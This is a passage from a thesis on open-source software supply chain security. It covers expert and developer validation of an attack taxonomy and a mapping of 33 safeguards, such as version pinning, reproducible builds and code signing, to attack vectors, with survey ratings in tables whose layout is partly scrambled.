|**Expert Survey**<br>**Overall Taxonomy Assessment**<br>**Structure**<br>**Agreement**<br>**Useful to**<br>**underst. Attack**<br>**Surface**<br>**Completeness**<br>1<br>5<br>1<br>5<br>1<br>5<br>**Assessment of 1st-level Nodes**<br>**Correct**<br>**Name**<br>**Correct**<br>**Category**<br>**Correct**<br>**Sub-Tree**<br>**_Develop and_**<br>**_Promote Trojan_**<br>**_Horse_**<br>Y<br>N<br>Y<br>N<br>1<br>5<br>**_Create Name_**<br>**_Confusion_**<br>Y<br>N<br>Y<br>N<br>1<br>5<br>**_Inject Into_**<br>**_Sources of_**<br>**_Legitimate_**<br>**_Package_**<br>Y<br>~~N~~<br>Y<br>N<br>1<br>5<br>**_Inject During_**<br>**_the Build of_**<br>**_Legitimate_**<br>**_Package_**<br>Y<br>~~N~~<br>Y<br>N<br>1<br>5<br>**_Distribute_**<br>**_Malicious_**<br>**_Version of_**<br>**_Legitimate_**<br>**_Package_**<br>Y<br>~~N~~<br>Y<br>N<br>1<br>5|**Developer Survey**|
|---|---|
||**Assessment of Understandability & Usefulness**|
||**Understandability**<br>**Useful to understand Attack**<br>**Surface**<br>1<br>5<br>1<br>5|
||**Awareness of and Protection against 1st-level Nodes**|
||**Aware of**<br>**Protected against**<br>**_Develop and_**<br>**_Promote Trojan_**<br>**_Horse_**<br>Yes: 120 (**90%**)<br>No: 14 (10%)<br>Yes: 70 (**52%**)<br>No: 11 (8%)<br>Idk: 53 (40%)<br>**_Create Name_**<br>**_Confusion_**<br>Yes: 95 (71%)<br>No: 39 (29%)<br>Yes: 48 (36%)<br>No: 15 (11%)<br>Idk: 71 (53%)<br>**_Inject Into_**<br>**_Sources of_**<br>**_Legitimate_**<br>**_Package_**<br>Yes: 108 (81%)<br>No: 26 (19%)<br>Yes: 49 (37%)<br>No: 15 (11%)<br>Idk: 70 (52%)<br>**_Inject During_**<br>**_the Build of_**<br>**_Legitimate_**<br>**_Package_**<br>Yes: 86 (**64%**)<br>No: 48 (36%)<br>Yes: 40 (30%)<br>No: 19 (**14%**)<br>Idk: 75 (56%)<br>**_Distribute_**<br>**_Malicious_**<br>**_Version of_**<br>**_Legitimate_**<br>**_Package_**<br>Yes: 97 (72%)<br>No: 37 (28%)<br>Yes: 42 (31%)<br>No: 19 (**14%**)<br>Idk: 73 (55%)|



– Table 4.1 Feedback from experts (left) and developers (right) on the taxonomy. At the top, qualitative assessments of the entire taxonomy, including aspects like completeness and comprehensibility, are rated on a Likert scale from 1 (low) to 5 (high). Below, qualitative assessments of 1st-level nodes within the initial taxonomy, including aspects like naming or awareness, are provided (Note: ’IdK’ stands for ’I do not know’). 

66 

_4.3. Validation and Assessment_ 

14 (82%) experts agreed to the overall structure with a rating of 4 or 5, slightly higher compared to the results of the tree-test. This could be due to some node names not being self-explanatory enough when shown with too little context. 

Experts were further asked to rate the correctness of the taxonomy’s 1st-level nodes in regards to naming, tree location, and sub-tree structure. All the first-level nodes received an overall good agreement with naming, categorization, and sub-tree structure, except _Develop and Advertise Distinct Malicious Package from Scratch_ . The latter only received neutral feedback on its sub-tree, a light agreement with its categorization, and a clear disagreement with its initial naming. 

12 (71%) of the experts agreed with the **completeness of the attack tree** . 

**==> picture [454 x 149] intentionally omitted <==**

– Figure 4.4 Initial taxonomy of OSS supply chain attacks before validation through user surveys. All the nodes that have not been involved in the refinement are collapsed (cf. Figure 4.3). 

Figure 4.4 shows the initial version of the taxonomy (only nodes that differ from the refined version of Figure 4.3 are shown). The complete set of modifications after the validation through the domain experts and software developers survey is as follows: 

- _Develop and Promote Trojan Horse_ renamed to _Develop and Advertise Malicious Package from Scratch_ ; 

- _Create Name Confusion_ renamed to _Create Name Confusion with Legitimate Package_ ; 

— New 1st-level node _Subvert Legitimate Package_ , with the former 1st-level nodes _Inject into Sources_ , _Inject During the Build_ and _Distribute Malicious Version_ as sub-nodes; 

— New node _Introduce Malicious Code through Hypocrite Merge Request_ to avoid the confusion between _Hide in Pull Request_ and _Introduce Vulnerability through Pull_ 

67 

Chapter 4 – _Contribution 1 - Taxonomy of Attacks on Open-Source Software Supply Chains_ 

_Request_ . Thus, below this new node we created sub-nodes describing the different ways to perform the parent goal. 

**Usefulness and Use-Cases** In this part of the questionnaire, experts rated the usefulness and possible use cases of the proposed taxonomy. 

15 (88%) rated the usefulness of the taxonomy to _understand the attack surface of the OSS supply chain_ with a 4 or 5. Fewer experts considered it being useful to understand _attacker tactics and techniques_ (12 (71%)) or _attackers’ cost/benefits considerations_ (5 (29%)). 

Regarding the expert options about possible uses of the proposed taxonomy, the Top-3 use-cases are _threat modeling_ , _awareness and training_ and _risk assessment_ . The complete results of the expert feedback on the possible use-cases of the taxonomy are depicted in Figure 4.5.Another possible use-case, though not included in the survey, is to scope penetration tests. 

**==> picture [455 x 179] intentionally omitted <==**

– Figure 4.5 Expert feedback on possible use-cases of the taxonomy. 

## **Validation and Assessment by Developers** 

The initial version of the taxonomy has also been validated and assessed by **134 software developers** in regards to the awareness of main attack vectors (1st-level taxonomy – nodes), whether those are mitigated (by themselves or their organization), and option– ally the understandability and utility of the taxonomy. 

68 

_4.4. Discussion_ 

**Awareness about Attack Vectors** The awareness of main attack vectors ranged from 120 (90%) for _Develop and Advertise Distinct Malicious Package from Scratch_ to 86 (64%) for _Inject During the Build of Legitimate Package_ . 

For all but one vector, the majority of respondents answered not to know whether they are protected. Only for _Develop and Advertise Distinct Malicious Package from Scratch_ , the majority believes in being protected (52%). For both vectors _Inject During the Build_ and _Distribute Malicious Version_ , 19 (14%) respondents were sure that no protection exists. 

**Taxonomy Understandability and Utility Assessment** Among the 134 participants, 53 (40%) decided to perform the optional assessment of the taxonomy’s understandability and utility to understand the supply chain’s attack surface. Considering a rating of 4 or 5, 41 (77%) found the taxonomy understandable and 46 (87%) recognized it as a useful means to create awareness. 

## **Response to RQ1.2** 

The proposed taxonomy of attacks on OSS supply chains takes the form of an attack tree covering all 107 vectors identified beforehand. Its validation by 17 domain experts and 134 software developers showed overall agreement with structure and naming, comprehensiveness, comprehensibility, and suitability for use-cases like threat modeling, awareness, training, or risk assessment. 

## **4.4 Discussion** 

While the taxonomy presented in Section 4.2 is largely agnostic to ecosystems, this section discusses differences between ecosystems. In addition, we present an analysis of the popularity of the attack vectors (based on the SLR) and we highlights the benefits of our work on possible future research. 

## **Differences between Ecosystems** 

As mentioned in Section 4.1, the attacker’s high-level goal is to **inject malicious code** into open-source artifacts such that it is executed downstream. Several techniques to this end are indeed independent of specific ecosystems/languages, e.g., _Take-over Legitimate Account_ or _Become Maintainer_ . 

69 

Chapter 4 – _Contribution 1 - Taxonomy of Attacks on Open-Source Software Supply Chains_ 

Other attack vectors, however, are specific: _Abuse Dependency Resolution Mechanism_ attacks depend on the approach and strategy used by the respective package manager to resolve and download declared dependencies from internal and external repositories. For instance, Maven, npm, pip, NuGet or Composer were affected by the dependency confusion attack, while Go and Cargo were not [150]. Several attacks below _Exploit Rendering Weakness_ depend on the interpretation and visualization of (Unicode) characters by user interfaces and compiler/interpreters [35]. Also name confusion attacks need to consider ecosystem specificities, especially _Built-In Packages_ . 

More differences exist when it comes to the **execution or trigger of malicious code** , which is beyond the taxonomy’s primary focus on code injection. For Python and Node.js, this is commonly achieved through installation hooks, which trigger the execution of code provided in the downloaded package (e.g., in `setup.py` for Python or `package.json` for JavaScript). A comparable feature is not present in most compiled languages, like Java or C/C++. In such cases, execution is achieved either at runtime, e.g., by embedding the payload in a specific function or initializer, or by poisoning test routines [27]. 

Differences also exist in regards to **code obfuscation and malware detection** . In case of interpreted languages, downloaded packages contain the malware’s source code, which makes it more accessible to analysts compared to compiled languages. The presence of encoded or encrypted code in such packages proofed being a good indicator of compromise [29], as there are few legimitate use-cases for open-source packages. Minification is one of them, however, matters primarily for frontend JavaScript libraries. Indeed, many existing attacks did not employ obfuscation or encryption [27] techniques. Still, the quantity of open-source packages and versions makes manual inspection very difficult, even if source code is accessible. 

When it comes to compiled code, well-known techniques like packing, dead-code insertion or subroutine reordering [151] make reverse engineering and analysis more complex. It is also noteworthy that ecosystems for interpreted languages ship compiled code. For instance, many Python libraries for ML/AI use-cases include and wrap platform-specific C/C++ binaries. 

## **Popularity of Attack Vectors** 

At the time of writing (October 2023) we collected a total of 369 references, of which 81 discuss real-world attacks and 126 are peer-reviewed papers. Figure 4.6 shows the number of publications by year for all the references (Fig. 4.6a), for the references related 

70 

_4.4. Discussion_ 

to real-world attacks (Fig. 4.6b), and for the peer-reviewed references (Fig. 4.6c). 

By grouping the peer-reviewed and real-world attacks references per attack vector we observe the following. 

Among the peer-reviewed references we have, in order of popularity: 

1. 35 resources discussing the general problem of _Conducting OSS Supply Chain Attack (AV-000)_ ; 

2. 33 resources discussing security aspects and issues about _distribution platforms (AV-500)_ ; 

3. 24 resources discussing security aspects and issues of _build systems (AV-400)_ ; 

4. 19 resources discussing security aspects and issues of _VCS (AV-300)_ ; 

5. 8 resources discussing problems on packages _creating name confusion with legitimate packages (AV-200)_ ; 

6. 3 resources discussing problems on _malicious packages developed and advertised from scratch (AV-100)_ . 

For what concerns real-world attacks we have, in order of popularity: 

1. 26 attacks that exploited the _creation of name confusion with legitimate packages (AV-200)_ ; 

2. 25 attacks that exploited attack vectors in the context of _distribution platforms (AV-500)_ ; 

3. 20 attacks that exploited attack vectors in the context of _VCS (AV-300)_ ; 

4. 14 attacks that exploited attack vectors in the context of _build systems (AV-400)_ ; 

5. 7 attacks that consisted of the _development and advertisement of a malicious package from scratch (AV-100)_ . 

It is straight-forward to observe that the most exploited vector among real-world attacks (i.e., _create name confusion with legitimate packages_ ) is the least discussed in academic papers. For other attack vectors there is almost a match between attack vectors addressed in peer-reviewed papers and popularity of attacks. The prevention of package name squatting is complex and there exist legitimate uses for which organizations do upload packages with similar names, e.g., using the same prefix for all packages they develop to make them easily recognizable. Academic work has begun to propose techniques for the detection of malicious code in package repositories. Though they do not target solely name squatting, one of the safeguards most discussed among peer-reviewed papers, 

71 

Chapter 4 – _Contribution 1 - Taxonomy of Attacks on Open-Source Software Supply Chains_ 

_application security testing_ (both static and dynamic), is protecting against such attacks as well as it has the advantage of being general (regardless of whether the malicious package name is squatted or not). However, vetting entire package repositories is computationally burdensome and the false-positive rate must be low so that analyst manual review is practically feasible. 

**==> picture [420 x 146] intentionally omitted <==**

**----- Start of picture text -----**<br>
20<br>20<br>60<br>15<br>15<br>40<br>10<br>10<br>20 5 5<br>0 0 0<br>Year Year Year<br>(a) (b) (c)<br>references<br>references<br>references<br>of attack<br>No. of peer-reviewed<br>No. of<br>No.<br>198419992002200320042005200620072008200920102011201220132014201520162017201820192020202120222023 2010 2011 2012 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 1999 2002 2004 2005 2006 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022<br>**----- End of picture text -----**<br>


– Figure 4.6 Number of collected references per years of publication. (a) References of all types; (b) References discussing real-world attacks; (c) Peer-reviewed references. 

## **Benefits of the Taxonomy for Future Research** 

Our work systematizes knowledge about OSS supply chain security by abstracting, contextualizing and classifying existing works. The proposed taxonomy can benefit future research by offering a central point of reference and a common terminology. The comprehensive list of attack vectors and safeguards (cf. Chapter 5) can support assessing the security level of open-source projects, e.g., to conduct comparative empiric studies across projects and ecosystems and over time. 

## **4.5 Threats to Validity** 

The taxonomy was modeled using the semantics of attack trees and several of its nodes reflect the characterizing stages of OSS supply chains, with code from project contributors and maintainers flowing to downstream consumers. Though its comprehensiveness, comprehensibility, and usefulness have been positively assessed by the survey participants, the taxonomy reflects the current state of the art. As the supply chain technologies evolve, it is expected that the proposed attack tree will evolve too. 

72 

_4.6. Conclusion_ 

We systematically reviewed the literature and continuously monitor aggregators of security news to create a comprehensive list of attack vectors, and collected feedback from domain experts to assess its completeness. Still, the complexity of OSS supply chains makes it very likely that new attack vectors and techniques will be discovered. The quality of the taxonomy will correspond to the degree of changes required to reflect such new attacks. 

The feedback collected from survey participants could have been biased if we only considered experts that we directly know. Instead, thanks to the snowball sampling we have reached also people outside of our network. Considering authors of relevant scientific works, experts from academia and industry, all working in the specific area of software supply-chain security, allowed us to reach the intended audience (cf. Appendix A): the 17 respondents of the expert survey were knowledgeable in supply chain security and actively participate in OSS projects, the 134 participants of the developer survey have knowledge in software development and use OSS regularly, and both groups cover a diverse range of programming languages, including those subject to frequent attacks. 

## **4.6 Conclusion** 

In this section of the thesis, we have endeavored to fill a gap in both academia and industry, namely, the lack of a comprehensive and technology-agnostic account of opensource software supply chain attacks. Our pursuit of knowledge systematization has allowed us to bridge this gap and offer a well-structured taxonomy. Verified and endorsed by domain experts, the taxonomy we have put forth for attacks on OSS supply chains stands as a holistic and easily understandable framework. Furthermore, it caters to a variety of practical applications, making it a valuable resource for future research endeavors. By serving as a central reference point and establishing a shared terminology, our taxonomy is poised to benefit the OSS community and the wider cybersecurity landscape. 

Having successfully collected an extensive list of attack vectors, we are now prepared to proceed with the next phase, wherein we will describe and map existing safeguards to these vectors, thus creating a robust framework for their mitigation. 

73 

Chapter 5 

## **- CONTRIBUTION 2 MAPPING OF EXISTING SAFEGUARDS TO RELATED ATTACK VECTORS** 

**Summary Problem Addressed:** P2 - Lack of Comprehensive Safeguards Mapping **Key Contribution(s):** Collection of 33 safeguards, mapped to the the attack vectors identified in Chapter 4. Expert and practitioners assessed their utility and cost. **Contribution Type:** Understanding **Point of view:** Defender **Associated Publication(s):** See references [1]–[3] **Scope:** 

**==> picture [212 x 100] intentionally omitted <==**

**----- Start of picture text -----**<br>
ATTACKER<br>1. Make the  2. Make the victim  3. Make the victim<br>malicious OSS  download the  execute the<br>package available malicious OSS  malicious code in<br>package the OSS package<br>DEFENDER<br>Detect malicious package<br>before download or<br>execution<br>**----- End of picture text -----**<br>


In alignment with MITRE’s Threat Analysis and Remediation Assessment (TARA) methodology, an engineering approach employed for the identification and assessment of cyber threats as well as the selection of effective countermeasures, the primary step in preventing and mitigating cyber threats involves the compilation of an exhaustive list of all conceivable threats. This compilation serves as the cornerstone for the identification of mitigating safeguards that can robustly counter these threats. 

Following the same approach, our aim in the first contribution of this thesis (refer to Chapter 4) involved presenting a comprehensive taxonomy of attacks on OSS supply chains. Thanks to the in-depth analysis and theSLR conducted in the preceding contribu- 

75 

Chapter 5 – _Contribution 2 - Mapping of Existing Safeguards to Related Attack Vectors_ 

tion, we have now established the capability to associate safeguards with each identified attack vector within the context of OSS supply chain attacks. 

In this section, we set out to answer the following **research questions** : 

- **RQ2.1** – Which general safeguards exist, and which attack vectors do they address? 

- – 

- **RQ2.2** What is the utility and cost of those safeguards? 

- **RQ2.3** – Which safeguards are used by developers? 

To address these questions, we adhered to the same methodology outlined in Section 4.1. 

In this context, the primary contributions encompass a collection of **33 safeguards** meticulously tailored to complement the taxonomy presented in Chapter 4. These safeguards underwent a qualitative evaluation, focusing on their utility and associated costs, conducted by the same **17 domain experts** who participated in our study. 

Additionally, the **134 developers** who took part in our survey provided feedback on the actual implementation, usage, and their perception of the costs associated with the identified safeguards. 

## **5.1 Methodology** 

To identify general safeguards, also in this case we reviewed the scientific and grey literature described in Section 4.1. Then, each safeguard is classified according to control type, stakeholder involvement, and mitigated attack vector(s). 

**Control type** classification follows the well-known distinction of directive, preventive, detective, corrective, and recovery controls [152]. However, since our focus is on – – _how_ malicious code no matter its actual intent can be injected into open-source and corresponding safeguards explains why recovery controls were out of scope. 

**Stakeholder involvement** reflects which role(s), maintainers, system administrators or consumers, can or must become active to effectively implement a given control. 

Finally, each safeguard has been assigned to those node(s) of the attack tree that it mitigates (partially or fully). To reflect the broader or narrower scope, they were assigned to the tree node with the least possible depth. 

Following the identification of these safeguards, they underwent assessments by both domain experts and software developers. This evaluation took place within the same survey, which was designed to assess the taxonomy, as described in Section 4.1. Domain experts provided feedback regarding the utility and associated costs of the safeguards, 

76 

_5.2. List of Safeguards_ 

addressing **RQ2.2** . Meanwhile, software developers had the additional opportunity to evaluate their use and awareness of these safeguards, focusing on the perspective of opensource consumers, as stipulated by **RQ2.3** . 

## **5.2 List of Safeguards** 

In total, we identified 33 safeguards that partially or completely mitigate the beforementioned attack vectors. Both implementation and use of those safeguards can incur non-negligible costs, also depending on the specifics of prg. languages and ecosystems at hand. Thus, the selection, combination and implementation of safeguards require careful planning and design, to balance required security levels and costs. 

The complete list of safeguards can be found in Table 5.1, including a classification after control type. All safeguards are mapped to the vector(s) they mitigate, some to the top-level goal due to (partially) addressing all vectors (e.g., establishing a vetting process), others to more specific subgoals. Some safeguards can be implemented by one or more stakeholders, while others require the involvement of multiple ones to be effective (e.g., signature creation and verification). 

**Common Safeguards** comprises 4 countermeasures that require all stakeholders to become active, i.e., project maintainers, open-source consumers, and administrators (service providers). For example, a detailed SBOM has to be produced and maintained by the project maintainer [153], ideally using automated SCA tools. Following, the SBOM must be securely hosted and distributed by package repositories, and carefully checked by downstream users in regards to their security, quality, and license requirements. 

**Safeguards for Project Maintainers and Administrators** comprises eight safeguards. _Secure authentication_ , for instance, suggests service providers to offer MFA or enforce strong password policies, while project maintainers should follow authentication best-practices, e.g., use MFA where available, avoid password reuse, or protect sensitive tokens. 

**Safeguards for Project Maintainers** includes seven countermeasures. Generally, OSS projects use hosted, publicly accessible VCSs. Maintainers should then, e.g., conduct careful _merge request reviews_ or enable _branch protection rules_ for sensitive project branches to avoid malicious code contributions. As project builds may still happen on maintainers’ workstations, they are advised to use _dedicated build services_ , esp. _ephemeral environments_ [44]. Additionally, they may _isolate build steps_ [43] such that they cannot 

77 

Chapter 5 – _Contribution 2 - Mapping of Existing Safeguards to Related Attack Vectors_ 

|**Safeguard**|**Control Type**<br>**Directive**<br>**Preventive**<br>**Detective**<br>**Corrective**|**Stakeholders Involved**<br>**OSS Maintainer**<br>**3P Service Prov.**<br>**OSS Consumer**<br>**Attack-Vector Addressed**|
|---|---|---|
|Maintain detailed Software Bill<br>of Materials (SBOM) and per-<br>form Software Composition Anal-<br>ysis (SCA)<br>Code signing<br>Use of security, quality and health<br>metrics<br>Reproducible builds<br>Secure authentication (e.g., Multi-<br>Factor<br>Authentication<br>(MFA),<br>password recycle, session timeout,<br>token protection)<br>User account management<br>Audit<br>Security assessment<br>Vulnerability assessment<br>Penetration testing<br>Scoped packages<br>Preventive squatting the released<br>packages<br>Pull/Merge request review<br>Protect production branch<br>Isolation of build steps<br>Ephemeral build environment<br>Use minimal set of trusted build<br>dependencies in the release job<br>Restrict access to system resources<br>of code executed during each build<br>steps<br>Use of dedicated build service<br>Manual source code review<br>Application Security Testing<br>Build dependencies from sources<br>Typo guard/Typo detection<br>Establish vetting process for Open-<br>Source components hosted in inter-<br>nal/public repositories<br>Runtime<br>Application<br>Self-<br>Protection (RASP)<br>Remove un-used dependencies<br>Prevent script execution<br>Code isolation and sandboxing<br>Version pinning<br>Dependency resolution rules<br>Establish internal repository mir-<br>rors and reference one private feed,<br>not multiple<br>Integrate Open-Source vulnerabil-<br>ity scanner into CI/CD pipeline<br>Integrity check of dependencies<br>through cryptographic hashes||_•_<br>_•_<br>_•_<br>AV-000<br>_•_<br>_•_<br>_•_<br>AV-200, AV-500<br>_•_<br>_•_<br>_•_<br>AV-000<br>_•_<br>_•_<br>_•_<br>AV-400, AV-500<br>_•_<br>_•_<br>AV-*00 _→_AV-602<br>_•_<br>_•_<br>AV-302,AV-402,AV-504,AV-600<br>_•_<br>_•_<br>AV-000<br>_•_<br>_•_<br>AV-000<br>_•_<br>_•_<br>AV-000<br>_•_<br>_•_<br>AV-000<br>_•_<br>_•_<br>AV-509<br>_•_<br>_•_<br>AV-200<br>_•_<br>AV-301, AV-302<br>_•_<br>AV-301, AV-302<br>_•_<br>AV-400<br>_•_<br>AV-400<br>_•_<br>AV-400<br>_•_<br>AV-400<br>_•_<br>AV-400 _→_AV-700<br>_•_<br>_•_<br>AV-300<br>_•_<br>_•_<br>AV-000<br>_•_<br>_•_<br>AV-400, AV-500<br>_•_<br>_•_<br>AV-200<br>_•_<br>_•_<br>AV-000<br>_•_<br>AV-000<br>_•_<br>AV-001<br>_•_<br>AV-000<br>_•_<br>AV-000<br>_•_<br>AV-001<br>_•_<br>AV-501, AV-508, AV-509<br>_•_<br>AV-501,AV-502, AV-504, AV-505<br>_•_<br>AV-000<br>_•_<br>AV-400, AV-500|



Table 5.1 – Safeguards against OSS supply chain attacks, incl. control type, stakeholder(s) involved in their implementation, and a mapping to mitigated attack vectors (cf. Figure 4.3 to resolve their identifiers). 

78 

_5.3. Experts Validation and Assessment_ 

tamper with the output of other build steps. 

**Safeguards for Administrators and Consumers** comprises five countermeasures. For example, both package repository administrators and consumers can opt for _building packages directly from source code_ [154], rather than accepting pre-built artifacts. If implemented by package repositories, this would reduce the risk of subverted project builds. If implemented by consumers, this would eliminate all risks related to the compromise of 3rd-party build services and package repositories, as they are taken out of the picture. 

**Safeguards for Consumers** includes nine countermeasures that may be employed by the downstream users. The consumers of OSS packages may reduce the impact of malicious code execution when consuming by _isolating the code and/or sandboxing_ it. Another example is the _establishment of internal repository mirrors_ [93] of vetted components. 

## **Response to RQ2.1** 

We identified 33 general safeguards to be used by the different stakeholders, mostly detective or preventive ones, and mapped them to the node(s) of the attack tree they mitigate partially or fully. 

## **5.3 Experts Validation and Assessment** 

This section presents the feedback of 17 experts regarding the safeguards’ utility to mitigate risks, and their associated costs for implementation and continued use. 

In summary, almost all the safeguards received medium to high utility ratings, while the cost ratings range from low (i.e., minimum mean value of 2.0) to very high (i.e., maximum mean value of 4.8). 

Table 5.2 provides all feedback collected for the 33 safeguards, following a discussion of safeguards with the highest, respectively lowest Utility-to-Cost (U/C) ratios, and some other interesting cases. 

**High U/C ratio.** Both _Protect production branch_ , _Remove un-used dependencies_ and _Version pinning_ show the highest U/C ratio, thus, are considered to be useful and cheap controls. The use of _Resolution Rules_ also shows a good U/C ratio, even though one expert highlighted that "very few projects" use them, and that the implementation would require the modification of all package managers. On average, _Preventive Squatting_ only received neutral ratings (3.1 for utility and 2.9 for cost) and also raised some concerns: 

79 

Chapter 5 – _Contribution 2 - Mapping of Existing Safeguards to Related Attack Vectors_ 

two of the experts highlighted that it could be good to "try to prevent name squatting, but hard to fully enforce" also due to legitimate reasons for similar names (e.g., to help consumers identify package relationships). 

**Low U/C ratio.** _Build Dependencies from Sources_ , reportedly used by Google [154], received a very low utility rating (mean and median of 3.0) and overall the lowest U/C ratio. Considering that its use would prune the subtrees of both vectors _Inject During the Build_ and _Distribute Malicious Version_ , we expected a higher utility rating. One expert claimed that "building from source only helps if someone scans and reviews the code". Possibly referring to flaky builds [155], another expert highlighted that "rebuilding software from source can sometimes introduce problems". 

_Merge Request Reviews_ received the highest average utility rating (4.6), which could be because if malicious code is injected into the sources, it is guaranteed to arrive at consumers, no matter how they consume it. 

_Reproducible Builds_ received a very high utility rating (5) from 10 participants (58.8%), but also a high-cost rating (4 or 5) from 12 (70.6%). One expert commented that a "reproducible build like used by Solarwinds now, is a good measure against tampering with a single build system" and another claimed this "is going to be the single, biggest barrier". 

_Scoped Packages_ , proposed as an effective safeguard against _Abuse of Dependency Resolution mechanisms_ [93], [150], mostly received neutral ratings (3) for both utility and cost. 

## **Response to RQ2.2** 

We have qualitatively assessed the utility and costs of the 33 safeguards by surveying 17 experts. The three safeguards _Protect production branch_ , _Remove un-used dependencies_ and _Version pinning_ showed the best U/C ratio while _Build dependencies from sources_ showed the worst. 

80 

_5.3. Experts Validation and Assessment_ 

|**Safeguard**|||**Experts**<br>**Cost**<br>**Mean**<br>**Median**<br>**Mean U/C**||**Developers**<br>**Cost**<br>**Mean**<br>**Median**|
|---|---|---|---|---|---|
||**Utility**|||**Usage**||
||**Mean**<br>**Median**|||||
|Protect production branch [121], [156]<br>Remove un-used dependencies [157]<br>Version pinning [22], [93], [150]<br>Dependency resolution rules<br>User account management [158]<br>Secure authentication (e.g., MFA, pass-<br>word recycle, session timeout, token pro-<br>tection) [22], [110]<br>Use of security, quality and health met-<br>rics [159]<br>Typo guard/Typo detection [22], [67]<br>Use minimal set of trusted build depen-<br>dencies in the release job [43]<br>Integrity check of dependencies through<br>cryptographic hashes [44], [47], [158],<br>[160]–[163]<br>Maintain detailed SBOM [115], [153],<br>[164]–[166]<br>and<br>perform<br>SCA<br>[153],<br>[165]–[171]<br>Ephemeral build environment [43], [44]<br>Prevent script execution<br>Pull/Merge request review [156]<br>Restrict<br>access<br>to<br>system<br>resources<br>of<br>code<br>executed<br>during<br>each<br>build<br>steps [43], [172], [173]<br>Code<br>signing<br>[47],<br>[48],<br>[158],<br>[162],<br>[163], [174], [175]<br>Integrate<br>Open-Source<br>vulnerability<br>scanner into CI/CD pipeline<br>Use of dedicated build service [44]<br>Preventive squatting the released pack-<br>ages<br>Audit, security assessment, vulnerabil-<br>ity assessment, penetration testing<br>Reproducible builds [40], [176], [177]<br>Isolation of build steps [43]<br>Scoped packages [93], [150]<br>Establish<br>internal<br>repository<br>mirrors<br>and reference one private feed, not mul-<br>tiple [93]<br>Abstract Syntax Tree [29], [33], [34],<br>[69], [78], [110], [170], [171], [178]–[181]|4.2<br>4.0<br>4.3<br>5.0||||1.8<br>2.0<br>2.0<br>2.0<br>2.1<br>2.0<br>2.7<br>3.0<br>2.3<br>2.5<br>2.5<br>3.0<br>2.7<br>3.0<br>3.1<br>3.0<br>3.8<br>4.0<br>2.3<br>2.0<br>2.9<br>3.0<br>2.8<br>2.5<br>2.4<br>2.0<br>3.6<br>4.0<br>3.8<br>3.5<br>3.1<br>3.0<br>3.1<br>3.0<br>3.0<br>3.0<br>3.8<br>3.5<br>3.8<br>3.5<br>3.5<br>4.0<br>3.2<br>3.0<br>2.8<br>2.0<br>2.7<br>3.0<br>3.7<br>3.0|
||||2.0<br>2.0<br>**2.10**|Y<br>N||
||||2.1<br>2.0<br>2.05|Y<br>N||
||3.7<br>3.0||2.2<br>2.0<br>1.68<br>2.6<br>3.0<br>1.58|Y<br>N<br>Y<br>N||
||4.1<br>4.0<br>3.9<br>4.0|||||
||||2.6<br>3.0<br>1.50|Y<br>~~N~~||
||4.3<br>5.0||2.9<br>3.0<br>1.48|Y<br>N||
||3.5<br>4.0<br>3.9<br>4.0<br>4.1<br>4.0<br>3.3<br>3.0<br>4.2<br>5.0<br>36<br>30||2.6<br>3.0<br>1.35|Y<br>N||
||||2.9<br>4.0<br>1.34<br>3.1<br>3.0<br>1.32<br>2.5<br>2.0<br>1.32<br>3.4<br>4.0<br>1.24<br>2.9<br>3.0<br>1.24<br>3.0<br>3.0<br>1.23<br>3.8<br>4.0<br>1.21<br>3.3<br>3.0<br>1.21<br>3.1<br>3.0<br>1.19<br>3.3<br>3.0<br>1.15<br>3.3<br>3.0<br>1.09<br>2.9<br>3.0<br>1.07<br>4.1<br>4.0<br>1.05<br>4.1<br>4.0<br>1.02<br>3.1<br>3.0<br>1.00<br>2.9<br>3.0<br>1.00<br>3.7<br>4.0<br>0.97<br>4.3<br>5.0<br>0.95|Y<br>N<br>Y<br>N<br>Y<br>N<br>Y<br>N<br>Y<br>~~N~~<br>Y<br>N<br>Y<br>N<br>Y<br>N<br>Y<br>N<br>Y<br>N<br>Y<br>~~N~~<br>Y<br>N<br>Y<br>~~N~~<br>Y<br>N<br>Y<br>N<br>Y<br>~~N~~<br>Y<br>N<br>Y<br>N||
||.<br>.<br>3.7<br>3.0|||||
||4.6<br>5.0<br>4.0<br>4.0|||||
||3.7<br>4.0|||||
||3.8<br>4.0<br>3.6<br>4.0<br>3.1<br>3.0<br>4.3<br>4.0<br>4.2<br>5.0<br>3.1<br>3.0<br>2.9<br>3.0<br>3.6<br>3.0|||||
||4.1<br>4.0|||||



81 

Chapter 5 – _Contribution 2 - Mapping of Existing Safeguards to Related Attack Vectors_ 

|**Safeguard**||**Experts**<br>**Cost**<br>**Mean**<br>**Median**<br>**Mean U/C**||**Developers**<br>**Cost**<br>**Mean**<br>**Median**|
|---|---|---|---|---|
||**Utility**<br>**Mean**<br>**Median**||**Usage**||
|Establish<br>vetting<br>process<br>for<br>Open-<br>Source<br>components<br>hosted<br>in<br>inter-<br>nal/public repositories [22], [23], [179],<br>[182], [183]<br>Code isolation and sandboxing [102],<br>[172], [173]<br>Runtime Application Self-Protection<br>Manual source code review [110]<br>Build dependencies from sources|4.1<br>4.0<br>3.9<br>4.0<br>3.7<br>4.0<br>4.1<br>4.0|4.3<br>5.0<br>0.95|Y<br>N|3.8<br>3.5<br>3.2<br>3.0<br>3.8<br>4.0<br>4.4<br>5.0<br>3.8<br>4.0|
|||4.2<br>4.0<br>0.93|Y<br>N||
|||4.2<br>4.0<br>0.88<br>4.8<br>5.0<br>0.85<br>4.1<br>4.0<br>0.73|Y<br>N<br>Y<br>N<br>Y<br>N||
||3.0<br>3.0||||



– Table 5.2 Assessment of safeguards by 17 domain experts (left) and 134 developers (right). Utility and cost assessments were given on a Likert scale, the numbers are shown with bar plots, from 1 (low) to 5 (high). The background of mean and median values are determined by the intervals [1 _,_ 2 _._ 5] , (2 _._ 5 _,_ 3 _._ 5] and (3 _._ 5 _,_ 5 _._ 0] . Safeguards are shown in the order of the mean of their **Utility-to-Cost Ratio (U/C)** (descending). Developer feedback on safeguard use was collected with yes/no questions, the number of respective answers are shown using a bar plot. 

## **5.4 Developers Validation and Assessment** 

In this optional part of the survey, developers were asked to assess the usage and costs of a subset of safeguards that were selected according to the stakeholders’ roles exercised in their daily work (collected in the demographic part). Among the total of 134 respondents, 30 assessed the _Common Safeguards_ , 5 the _Safeguards for Project Maintainers_ , 4 the _Safeguards for Maintainers and Administrators_ , 24 the _Safeguards for Administrators and Consumers_ , and 22 the _Safeguards for Consumers_ . Complete results are shown in Table 5.2 

